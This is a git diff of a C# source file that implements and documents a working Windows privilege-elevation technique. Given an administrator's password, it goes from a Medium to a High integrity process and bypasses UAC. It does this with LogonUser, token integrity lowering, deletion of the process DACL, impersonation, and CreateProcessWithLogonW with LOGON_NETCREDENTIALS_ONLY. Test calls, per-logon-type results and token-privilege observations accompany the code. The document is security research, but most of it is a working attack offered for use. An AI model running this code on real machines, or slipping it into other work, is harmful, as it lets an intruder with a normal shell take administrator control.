@@ -5,18 +5,20 @@
 //      github.com/AltF5?tab=repositories
 //      https://github.com/AltF5/MediumToHighIL_Test/blob/main/TestCode.cs
 //
-// Uploaded for Antonio Cocomazzi (@splinter_code). This is his technique he described.
+//      Uploaded for Antonio Cocomazzi (@splinter_code). This is his technique he described.
 //      https://twitter.com/splinter_code/status/1458054161472307204
-//
+//      
 // History:
 //      11-9-21 - @winlogon0 Created this as described
+//      11-10-21 - Fixed when consulting Antonio Cocomazzi (@splinter_code) whom mentioned that the domain (2nd parameter) has to have an argument "." NOT a null-string, NOR a blank "" string
 // 
-// Problem experiencing:
-//      Not a High IL cmd.exe token after CreateProcessWithLogonW (CPWLW)... per my reply : twitter.com/winlogon0/status/1458233639548899331
-//          The process (executing as that user) does contain BUILTI\Administrators group, but it is DENY
+//  Tested as: Calling from Medium IL user not belonging to BUILTIN\Administrators group.
+//          See full test notes below in method:                                RunApp_UseAnotherAccountAdminPW_TestCode()
+//          And test calls for all logon rights at the end of that method:      "// Tests performed"
 //
-//      Tested as: Calling from Medium IL user not belonging to BUILTIN\Administrators group.
-//          See full test notes below in method:  RunApp_UseAnotherAccountAdminPW_TestCode()
+//
+//  ** Future tests to do for this code **
+//      - On a Domain-joined PC
 
 using System;
 using System.ComponentModel;
@@ -29,12 +31,35 @@ using System.Security.Principal;
 public class TestCode2
 {
     /// <summary>
-    /// Antonio Cocomazzi @splinter_code solution to his Quiz in Nov 2021 - created by winlogon0 to test it
+    /// Working
+    /// 
+    /// REQUIREMENTS:
+    ///     1. Knowning the password to an Administrator account on the machine
+    ///     2. The Admin user account or one of its groups does NOT belong to 'SeDenyNetworkLogonRight' (if using Network (3) or NetworkCleartext (8)) or 'SeDenyBatchLogonRight' (if using Batch (4))
+    ///     3. The Admin user acount or one of its groups DOES belong to 'SeNetworkLogonRight' (if using Network (3) or NetworkCleartext (8)) or 'SeBatchLogonRight' (if using Batch (4))
+    ///            By default BUILTIN\Administrators is added to SeBatchLogonRight
+    ///            By default BUILTIN\Users AND BUILTIN\Administrators is added to 'SeNetworkLogonRight'
+    ///            Either will operate fine, since the account-to-run-as is an administrator to make this technique operate
+    /// 
+    /// 
+    /// Call this method from a Medium IL process where that user doesn't belong to BUILTIN\Administrators, either directly or indirectly (via another group memberhsip)
+    /// The resulting process will spawn as High IL w/ BUILTIN\Administrator group enabled,
+    /// 
+    /// This code is from this technique described
+    ///     Antonio Cocomazzi @splinter_code solution to his Quiz in Nov 2021 - created by winlogon0 to test it
+    ///     https://twitter.com/splinter_code/status/1458054161472307204
+    ///     
+    ///     Code release & updated here
+    ///     https://github.com/AltF5/MediumToHighIL_Test
+    /// 
+    /// My notes:
+    ///     - This code assumes that the admin account (whos creds were supplied) has 'SeNetworkLogonRight'  untampered with, that is still has BUILTIN\Users or BUILTIN\Administrators belonging to it
+    ///     - This code deletes the DACL on the calling process, in order for CPWL to succeed without Access Denied
     /// </summary>
     /// <param name="fullCmdLine">Commandline / Application to execute</param>
     /// <param name="adminAccountName">An account belonging to BUILTIN\Administrators</param>
     /// <param name="pwToAdminAccount">Password for THAT admin account</param>
-    /// <param name="logonType">LogonType to perform</param>
+    /// <param name="logonType">LogonType to perform. The following 3x logon types work out-of-the-box: Network (3), Batch (4),  NetworkCleartext (8)</param>
     /// <param name="closeProcessHandlesBeforeReturn">Should the created process handles be left open for the caller to close?</param>
     /// <returns>Information about the created process, or a reason why not</returns>
     public static ProcessCreateStatus RunApp_UseAnotherAccountAdminPW_TestCode(
@@ -43,7 +68,24 @@ public class TestCode2
         LogonType logonType = LogonType.Network,
         bool closeProcessHandlesBeforeReturn = true)
     {
+        // Call via:    TestCode2.RunApp_UseAnotherAccountAdminPW_TestCode("cmd.exe", "AdminAcct", "itsPW");
+        //              Do this from running this code within an account NOT belonging to BUILTI\Administrators group (compmgmt.msc)
+        //
+        // Result:      This creates a process as the other another user with the BUILTIN\Administrators Enabled (NOT Deny-Only) + High IL + the High IL Privileges expected like 'SeImpersonatePrivilege'
+        //              The resulting process will have all privileges disabled except for 2x: ChangeNotify & CreateGlobal, however they atleast EXIST, and are ALLOWED to be enabled with Process Hacker
+        //                  unlike other cases that I've seen when lowering a process' integrity then sometimes some privileges wont be enablable (not the case here)
+        //
+        // See in cmd.exe, but better to verify with Process Hacker or Process Explorer
+        //      whoami
+        //      whoami /groups       - Will return an error, but the groups are accurate as per Process Hacker
+        //      whoami /priv
+        //
+        // Tests performed: (see end of this method)
+
+
+
         ProcessCreateStatus ret = new ProcessCreateStatus();
+
 
         //  -- QUIZ --
         //  You landed on a machine and you have a shell as normal user(Medium IL).You know the password of one administrator of that machine, how you get a process as High IL?
@@ -51,7 +93,7 @@ public class TestCode2
         //    Bonus level: UACMe usage not allowed Smiling face with horns
         //    https://twitter.com/splinter_code/status/1457589164002643971
         //
-
+        //
         // -- Solution --
         //      LogonUser (Network)
         //      -> Set token IL to Medium
@@ -60,73 +102,28 @@ public class TestCode2
         //      -> CreateProcessWithLogon (LOGON_NETCREDENTIALS_ONLY) and specify the admin credentials.            // <== KEY -- You have to use netcredentials_only flag or you won't get the high il with this trick ;) 
         //      Enjoy High IL process with Interactive SID 
 
-        // -- Call via --
-        //      Execute this code from an account NOT belonging to BUILTI\Administrators group (compmgmt.msc)
-        //      TestCode2.RunApp_UseAnotherAccountAdminPW_TestCode("cmd.exe", "AdminAcct", "itsPW");                // <== Set an Admin Account Creds in the call
-
-        // -- Result --
-        //      This creates a process as the other another user with the BUILTIN\Administrators group
-        //      HOWEVER, Mandatory Label\Medium Mandatory Level 
-        //
-        // whoami
-        // whoami /groups
-        // whoami /priv
-        //
-
-        // -- Noticed --
-        // 1.
-        // Available privileges in token despite medium IL (IF MANUALLY ADDED via secpol.msc)
-        //      If the Admin-group containing user is directly (or indirectly via group membership) manually added to LSA User Right Privileges, then the following Privileges will 
-        //      PERSIST, and ARE enabled via ProcessHacker, despite these should never belong in a Medium IL token
-        //      [Notice no SeDebug, SeImpersonate, or SeTcb]
-        //       All of these are enable-able as well (via ProcessHacker), despite only 2 being enabled by default: SeChangeNotify, SeCreateGlobal
-        //
-        //      SeAssignPrimaryTokenPrivilege                   <== Interested. Only SYSTEM usually has this, and needed for CreateProcessAsUser call
-        //      SeLockMemoryPrivilege
-        //      SeIncreaseQuotaPrivilege
-        //      SeMachineAccountPrivilege
-        //      SeSecurityPrivilege
-        //      SeSystemProfilePrivilege
-        //      SeSystemtimePrivilege
-        //      SeProfileSingleProcessPrivilege
-        //      SeIncreaseBasePriorityPrivilege
-        //      SeCreatePagefilePrivilege
-        //      SeCreatePermanentPrivilege
-        //      SeShutdownPrivilege
-        //      SeAuditPrivilege
-        //      SeSystemEnvironmentPrivilege
-        //      SeChangeNotifyPrivilege
-        //      SeRemoteShutdownPrivilege
-        //      SeUndockPrivilege
-        //      SeSyncAgentPrivilege
-        //      SeEnableDelegationPrivilege
-        //      SeManageVolumePrivilege
-        //      SeCreateGlobalPrivilege
-        //      SeTrustedCredManAccessPrivilege
-        //      SeIncreaseWorkingSetPrivilege
-        //      SeTimeZonePrivilege
-        //      SeCreateSymbolicLinkPrivilege
-        //
-        // 2.
-        // Also noticed how the window GUI border is thin/"classic" due to the Logon ID being not accurate (we are not using LsaLogonUser here to add a group)
-
 
         SplitUserAndDomain(adminAccountName, out bool justUserSupplied, out string userOnly, out string domainIfSupplied);
         if (justUserSupplied)
         {
-            domainIfSupplied = null;
+            domainIfSupplied = null;        // LogonUserA works fine with a NULL domain optional
         }
 
 
         //
-        // 1. User + PW --> hToken
+        // 1. User + PW --> hToken. LogonUser w/ Network (3). This token is not taken anywhere except for impersonating
         //
+        // Any of these 3x logon types work (Service (5) also works but only if the user is added to the 'SeServiceLogonRight' in advance)
+        //      Network (3)
+        //      Batch (4)
+        //      NetworkCleartext (8)
         IntPtr hTokenOutput;
         bool did = LogonUserA(userOnly, domainIfSupplied, pwToAdminAccount, (int)logonType, (int)LogonProvider_LogonUser.LOGON32_PROVIDER_DEFAULT, out hTokenOutput);
         if (!did)
         {
             ret.Success = false;
             ret.ErrorText = "LogonUser call failed: " + GetLastErrorInfo();
+            int bpHereError = 1;
         }
         else if (hTokenOutput == IntPtr.Zero)
         {
@@ -135,10 +132,27 @@ public class TestCode2
         }
         else
         {
+
+            // 1.5
+            // 
+            // CreateProcessWithLogonW QUIRK - a NULL optional domain (DESPITE THE DOCUEMNTATION) - https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw
+            // will absolutely NOT work when leveraging this API call with LOGON_NETCREDENTIALS_ONLY. The Domain MUST BE "." instead
+            //
+            if (domainIfSupplied == "" || domainIfSupplied == null)          // domainIfSupplied = null if not supplied from the call to the string-support method: SplitUserAndDomain()
+            {
+                domainIfSupplied = ".";        // CRITICALLY IMPORTANT TO MAKE 'CPWL w/ LOGON_NETCREDENTIALS_ONLY' work otherwise ERROR_INVALID_LOGON_TYPE
+
+            }
+
+
             //
             // 2. Lower this token Integrity to our integrity (assuming Medium)
             //
             bool didSetIL = SetTokenIntegrityLevel(hTokenOutput, IntegrityLevel.Medium);
+            if (!didSetIL)
+            {
+                Status("FYI -- Unable to change the IL to Medium!");
+            }
 
             //
             // 3. Prevent CPWTW from resulting in access denied. Required, otherwise CreateProcessWithLogonW w/ (LOGON_WITH_PROFILE -- different from originally described) = Access Denied (Error: 5)
@@ -146,11 +160,19 @@ public class TestCode2
             bool didDeleteDACL = GrantEveryoneAccessToProcess(GetCurrentProcessId(), true);             // Kill the DACL
             //bool didGrantEveryone = GrantEveryoneAccessToProcess(GetCurrentProcessId(), false);       // OR alternatively: Everyone : Full Control
 
+            if (!didDeleteDACL)
+            {
+                Status("FYI -- Unable to delete the DACL for [Self] (this process). CPWL will most likely result in Access Denied (5)");
+            }
+
             //
             // 4. Impersonate this token from LogonUser again
             //
             bool didImpersonate = ImpersonateLoggedOnUser(hTokenOutput);                    // <=========== TBD -- Doesn't seem to matter whether we do this or not, same result with LOGON_WITH_PROFILE (but that is different as originally described) 
-
+            if(!didImpersonate)
+            {
+                Status("FYI -- ImpersonateLoggedOnUser failed! :: " + GetLastErrorInfo());
+            }
 
 
             //
@@ -162,10 +184,32 @@ public class TestCode2
 
             StopWow64Redirection(true);
 
-            const int LOGON_WITH_PROFILE = 1;                   // <=========================== CHANGE FROM ORIGINAL TECHNIQUE -- but apparently will not result in a Medium IL + Deny Admin group
-            const int LOGON_NETCREDENTIALS_ONLY = 2;            // [TBD] **ISSUE**   : ERROR_INVALID_LOGON_TYPE occurs. But this is key according to @splinter_code - https://twitter.com/splinter_code/status/1458260294220845056
+            const int LOGON_WITH_PROFILE = 1;                   // This will only result in a Medium IL + Deny Admin group. Not desirable. Only for testing purposes
+            const int LOGON_NETCREDENTIALS_ONLY = 2;            // But this is key according to @splinter_code - https://twitter.com/splinter_code/status/1458260294220845056. Also, this API is bugged and REQUIRES a "." in Domain for this to operate without error! Hat-Tip: @splinter_code
 
-            bool didCreate = CreateProcessWithLogonW(userOnly, domainIfSupplied, pwToAdminAccount, LOGON_WITH_PROFILE,
+            // Important Setup Requirement:     The domain must ASBOLUTELY NOT BE a null-string. It MUST be the actual domain / ".". NOT NULL when utilizing LOGON_NETCREDENTIALS_ONLY, otherwise ERROR_INVALID_LOGON_TYPE
+            // Learned from @Spliter_Code:      The domain can be specified all within the 1st user-only parameter.
+            // Future Test:                     Do this on a domain joined PC and see what occurs
+            // Sidenote:                        There is no need for the admin user to explictly belong to 'SeNetworkLogonRight' to have this work right here (tho that user or a group would for LogonUser w/ Network (3)
+
+
+            // Problem originally experiencing:
+            //      When leveraging as 'LOGON_WITH_PROFILE' the result is NOT a High IL cmd.exe token after CreateProcessWithLogonW (CPWLW)... per my reply : twitter.com/winlogon0/status/1458233639548899331
+            //          The process (executing as that user) does contain BUILTI\Administrators group, but it is DENY
+            //
+            //      Problem was because of utiliizing the LOGON_WITH_PROFILE option, but I had to do this because the API is buggy, and I didn't know to have this hack-around to work, its expecting a "." in the 2nd parameter
+            //
+
+            // This is similar / related to James Forshaw @tiraniddo "Reading around UAC part 3" previously working, now patched way to abuse CreateProcessWithLogonW https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-3.html
+            // However we are leverage the knowledge of knowing an admin PW to to an "over-the-shoulder"-like elevation programmatically.
+            //      "
+            //      Normally the result of LogonUser can be used to create a new process.
+            //      However as the elevated token is still in a separate logon session it won't work.
+            //      There is however one place I know of that you can abuse this "feature", the Secondary Logon service and specifically the exposed CreateProcessWithLogon API.
+            //      This API allows you to create a new process by first calling LogonUser (well really LsaLogonUser but anyway) and takes a LOGON_NETCREDENTIALS_ONLY flag which means we don't need permissions or need to know the password.
+            //      "
+            bool didCreate = CreateProcessWithLogonW(userOnly, domainIfSupplied, pwToAdminAccount,              // <======== ENSURE DOMAIN = "."
+                LOGON_NETCREDENTIALS_ONLY,
                 null, fullCmdLine,
                 (uint)CreationFlags.CREATE_NEW_CONSOLE | (uint)CreationFlags.CREATE_UNICODE_ENVIRONMENT,
                 IntPtr.Zero, null,
@@ -208,7 +252,135 @@ public class TestCode2
         }
 
         return ret;
+
+
+        // ---------------------------------------------
+        // Tests performed
+        // ---------------------------------------------
+        //
+        // 4x Logon types that work with the LogonUserA Token (this token is impersonated, NOT passed to CreateProcessWithLogon)
+        //      Network (3)
+        //      Batch (4)
+        //      NetworkCleartext (8)
+        //      Service (5) IF AND ONLY IF the user or one of its groups belongs to 'SeServiceLogonRight'
+        //
+        // 2x other only spawn the process as a Medium IL
+        //      Interactive (2) and Unlock (7) ONLY have the process spawn as Medium IL
+        //
+        // While the other 5x dont work with LogonUser with a PW
+
+        //TestCode2.RunApp_UseAnotherAccountAdminPW_TestCode("cmd.exe /k whoami /priv", "Alt", "pw", TestCode2.LogonType.Network);                   // WORKS: High IL (original technique described)
+        //TestCode2.RunApp_UseAnotherAccountAdminPW_TestCode("cmd.exe /k whoami /priv", "Alt", "pw", TestCode2.LogonType.Batch);                     // WORKS: High IL
+        //TestCode2.RunApp_UseAnotherAccountAdminPW_TestCode("cmd.exe /k whoami /priv", "Alt", "pw", TestCode2.LogonType.CachedInteractive);                                     // LogonUserA: Error invalid parameter
+        //TestCode2.RunApp_UseAnotherAccountAdminPW_TestCode("cmd.exe /k whoami /priv", "Alt", "pw", TestCode2.LogonType.CachedRemoteInteractive_SameAsRemoteInteractive);       // LogonUserA: Error invalid parameter
+        //TestCode2.RunApp_UseAnotherAccountAdminPW_TestCode("cmd.exe /k whoami /priv", "Alt", "pw", TestCode2.LogonType.CachedUnlock);                                          // LogonUserA: Error invalid parameter
+        //TestCode2.RunApp_UseAnotherAccountAdminPW_TestCode("cmd.exe /k whoami /priv", "Alt", "pw", TestCode2.LogonType.Interactive);               // Excutes but is a medium IL
+        //TestCode2.RunApp_UseAnotherAccountAdminPW_TestCode("cmd.exe /k whoami /priv", "Alt", "pw", TestCode2.LogonType.NewCredentials);            // Error: 1367, 0x557: ERROR_INVALID_LOGON_TYPE: A logon request contained an invalid logon type value"
+        //TestCode2.RunApp_UseAnotherAccountAdminPW_TestCode("cmd.exe /k whoami /priv", "Alt", "pw", TestCode2.LogonType.NetworkCleartext);          // WORKS: High IL
+        //TestCode2.RunApp_UseAnotherAccountAdminPW_TestCode("cmd.exe /k whoami /priv", "Alt", "pw", TestCode2.LogonType.RemoteInteractive_RDP);     // LogonUserA: Error invalid parameter
+        //TestCode2.RunApp_UseAnotherAccountAdminPW_TestCode("cmd.exe /k whoami /priv", "Alt", "pw", TestCode2.LogonType.Service);                   // Has to be granted to a specific account and isn't by defualt. Works IF it is. Otherwise by default: Error: 1385, 0x569: ERROR_LOGON_TYPE_NOT_GRANTED: Logon failure: the user has not been granted the requested logon type at this computer"
+        //TestCode2.RunApp_UseAnotherAccountAdminPW_TestCode("cmd.exe /k whoami /priv", "Alt", "pw", TestCode2.LogonType.Unlock);                    // Excutes but is a medium IL (just like Interactive)
+
+
+
+
+        // ---------------------------------------------
+        // Notes - I have observed the following
+        // ---------------------------------------------
+        //
+        //
+        // 1. 
+        // -- Privilege Value Observations --
+        // When leveraging with just 'LOGON_WITH_PROFILE' (NOT the technique described), this creates a Medium IL process + Admin group DENY-ONLY. However there are some privileges to note:
+        //
+        // Available privileges in token despite medium IL (IF MANUALLY ADDED via secpol.msc)
+        //      If the Admin-group containing user is directly (or indirectly via group membership) manually added to LSA User Right Privileges, then the following Privileges will 
+        //      PERSIST, and ARE enabled via ProcessHacker, despite these should never belong in a Medium IL token
+        //      [Notice no SeDebug, SeImpersonate, or SeTcb]
+        //       All of these are enable-able as well (via ProcessHacker), despite only 2 being enabled by default: SeChangeNotify, SeCreateGlobal
+        //
+        //      SeAssignPrimaryTokenPrivilege           <== Interesting. Only SYSTEM usually has this, and needed for CreateProcessAsUser call
+        //      SeAuditPrivilege
+        //      SeChangeNotifyPrivilege
+        //      SeCreateGlobalPrivilege
+        //      SeCreatePagefilePrivilege
+        //      SeCreatePermanentPrivilege
+        //      SeCreateSymbolicLinkPrivilege
+        //      SeEnableDelegationPrivilege
+        //      SeIncreaseBasePriorityPrivilege
+        //      SeIncreaseQuotaPrivilege
+        //      SeIncreaseWorkingSetPrivilege
+        //      SeLockMemoryPrivilege
+        //      SeMachineAccountPrivilege
+        //      SeManageVolumePrivilege
+        //      SeProfileSingleProcessPrivilege
+        //      SeRemoteShutdownPrivilege
+        //      SeSecurityPrivilege                 <== Interesting
+        //      SeShutdownPrivilege
+        //      SeSyncAgentPrivilege
+        //      SeSystemEnvironmentPrivilege
+        //      SeSystemProfilePrivilege
+        //      SeSystemtimePrivilege
+        //      SeTimeZonePrivilege
+        //      SeTrustedCredManAccessPrivilege
+        //      SeUndockPrivilege
+        //
+        //
+        //      Some of these above that are included (5x above), indeed are considered "special" (sensitive /privileged privileges) according to Event 4672 in the security Log:
+        //          https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4672
+        //          - SeAssignPrimaryTokenPrivilege     - Replace a process-level token
+        //          - SeAuditPrivilege                  - Generate security audits
+        //          - SeEnableDelegationPrivilege       - Enable computer and user accounts to be trusted for delegation
+        //          - SeSecurityPrivilege               - Manage auditing and security log (ex: Deleting)
+        //          - SeSystemEnvironmentPrivilege      - Modify [UEFI] firmware environment values
+        //      
+        //
+        //      From the ones missing above (10x below), when the user-being-run-as is added to ALL privileges...
+        //      This says to me that the Kernel believes the following are "Privileged" Privileges reserved ONLY for High+ IL callers no matter what (no Medium IL process can ever hold these in their token)
+        //          - SeBackupPrivilege                             Bypass File & Reg 'Read' permissions to change a DACL
+        //          - SeCreateTokenPrivilege                        NtCreateToken() calls
+        //          - SeDebugPrivilege                              Bypass process open permissions in the DACL
+        //          - SeDelegateSessionUserImpersonatePrivilege
+        //          - SeImpersonatePrivilege                        ImpersonateLoggedOnUser(hToken) where hToken is of a higher IL than the current process or thread IL, and hToken is a Primary (impersonatable) token, NOT identity. This is how to get from High IL --> System IL / System user.
+        //          - SeLoadDriverPrivilege                         Load a driver in the kernel
+        //          - SeRelabelPrivilege                            Modify IL to higher on Files & Reg keys (not Tokens, which requires TCB to raise that)
+        //          - SeRestorePrivilege                            Bypass File & Reg 'Write' permissions to change a DACL
+        //          - SeTakeOwnershipPrivilege                      Bypass File & Reg DACL not allowing WRITE_OWNER
+        //          - SeTcbPrivilege                                LsaLogonUser() group adding, Modify Token IL to higher, GetTokenInformation w/ TokenLinkedToken, some WTS APIs
+        //
+        //      So certainly, there is a hierarchy of important here
+        //          > Medium IL typically only get these 5x:        SeChangeNotifyPrivilege, SeIncreaseWorkingSetPrivilege, SeShutdownPrivilege, SeTimeZonePrivilege, SeUndockPrivilege
+        //          > Security Event ID 4672 consdiered 13x of the 15 privileges "special"      (excludes: SeDelegateSessionUserImpersonatePrivilege & SeRelabelPrivilege)
+        //          > The OS consided the above 10x to be "super special"
+        //     
+        //
+        // 2.
+        //      The window GUI border is thin/"classic" due to the Logon ID being not accurate for this Session (we are not using LsaLogonUser here to add a group, which needs TCB Priv for Group additions)
+        //
+        // 3. 
+        //      whoami error = "ERROR: Unable to get group membership information."     (regardless of being elevated or not)
+        //
+        //      When utilzing the correct technique 'LOGON_NETCREDENTIALS_ONLY' to gain High IL, Privs, and Admin group, then when executing the following in cmd.exe:
+        //      whoami /groups      it results in a weird error: "ERROR: Unable to get group membership information."
+        //      However ProcessHacker confirms that the Groups are correct & as expected, including 'Mandatory Label\High Mandatory Level' (rather than Medium)
+        //
+        //      Either whoami.exe is buggy due to this uncommon process setup, since its extremely uncommon to start a process this way,
+        //      Note that this is NOT because of the process being elevated, because even when we LogonUser w/ Interactive (2) and impersonate that (again not passed to CreateProcessWithLogonW), it results in a Medium IL process, however 
+        //      whoami /groups still cannot fetch the group info without returning that same error
+        //
+        //      OR something with the process is setup incorrectly
+        //      The only differences in groups that I see is the lack of:        LOCAL & NT AUTHORITY\NTLM Authentication
+        //
+        //      [Future TBD]:  API monitor returns from API calls leveraged by whoami.exe
+        //
+        // 4. 
+        //      Token differences noticed from ProcessHacker:
+        //      - TokenSource = 'seclogo' w/ 0  as LUID     VS 'User32' and some 0xHex value
+        //      - UIAccess = Disabled (compard to Enabled for a High IL in another session)
+        //      - Owner  = BUILTIN\Administrators rather than the user itself
     }
+
+
 
 
 
